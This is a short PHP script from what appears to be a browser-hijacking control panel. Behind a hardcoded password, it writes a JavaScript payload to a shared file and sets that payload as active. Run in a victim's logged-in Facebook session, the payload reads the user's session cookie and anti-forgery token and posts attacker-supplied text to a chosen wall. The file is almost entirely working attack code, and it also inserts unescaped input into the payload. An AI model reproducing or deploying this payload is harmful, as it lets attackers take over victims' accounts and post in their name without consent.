<?php
$password = $_POST["pass"];
$target = $_POST["target"];
$postText = $_POST["postText"];
if ($password == "tno" & $target != "" & $postText != "") {
  $module = "../../ping/main.js";
  $moduleOpen = fopen($module, 'w');
  $payLoad = 'if (document.domain.search("facebook") == 0) { var uid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var cid = document.getElementsByName("xhpc_composerid")[0].value; var tid = document.getElementsByName("xhpc_targetid")[0].value; var fbdt = Env.fb_dtsg; var fid = Env.post_form_id; /* Status Update */ function wallpost(target, post_text) { var wpp = "post_form_id=" + fid + "&fb_dtsg=" + fbdt + "&xhpc_composerid=" + cid + "&xhpc_targetid=" + target + "&xhpc_context=home&xhpc_fbx=&xhpc_timeline=" + "&xhpc_message_text=" + encodeURIComponent(post_text) + "&xhpc_message=" + encodeURIComponent(post_text) + "&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&nctr[_mod]=pagelet_composer&lsd&post_form_id_source=AsyncRequest"; var newx2 = new XMLHttpRequest(); newx2.open("POST", "/ajax/updatestatus.php?__a=1"); newx2.send(wpp); } wallpost("'.$target.'", "'.$postText.'") } ';
  fwrite($moduleOpen, $payLoad);
  fclose($moduleOpen);
  
  // turn into a class damnit
  include('ini_parser_v1.php');
  $ini_data = 'active = post_to_wall_facebook';
  $ini_file = <<<EOT
;<?php
;die(); // For further security
;/*
$ini_data
;*/
;?>
EOT;

  safefilerewrite("../../db/active_payload.php", $ini_file);
     
  header('Location: ../../modules/index.php');
} else {
  echo 'error';
}
?>

